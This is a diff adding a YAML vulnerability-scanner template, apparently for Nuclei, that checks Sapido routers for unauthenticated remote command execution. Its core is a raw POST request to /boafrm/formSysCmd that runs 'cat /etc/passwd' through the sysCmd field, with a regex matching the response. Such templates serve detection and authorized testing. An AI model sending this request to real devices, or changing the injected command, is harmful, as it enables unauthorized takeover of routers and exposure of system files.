@@ -1,0 +1,28 @@
+id: poc-yaml-sapido-router-unauthenticated-rce
+
+info:
+  name: poc-yaml-sapido-router-unauthenticated-rce
+  author: 2husky
+  severity: critical
+  tags: xray-converted,rce,unauth,ct-446245
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/Sapido/Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        POST /boafrm/formSysCmd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sysCmd=cat+%2Fetc%2Fpasswd&apply=Apply&submit-url=%2Fsyscmd.htm&msg=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
